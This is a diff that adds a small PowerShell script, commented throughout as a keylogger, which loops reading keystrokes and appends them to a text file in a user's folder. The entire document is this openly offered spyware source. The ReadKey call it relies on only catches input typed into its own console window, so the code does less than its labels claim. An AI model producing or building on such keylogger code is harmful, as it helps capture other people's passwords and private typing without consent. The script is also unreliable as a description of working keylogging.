@@ -1,0 +1,20 @@
+# Path to the log file
+$logFilePath = "C:\Users\reaxs\keylog.txt"
+
+# Function to log keystrokes
+function Log-Keystroke($key) {
+    Add-Content -Path $logFilePath -Value $key
+}
+
+# Function to start the keylogger
+function Start-Keylogger {
+    while ($true) {
+        $key = [System.Console]::ReadKey($true).KeyChar
+        if ($key) {
+            Log-Keystroke $key
+        }
+    }
+}
+
+# Start the keylogger
+Start-Keylogger
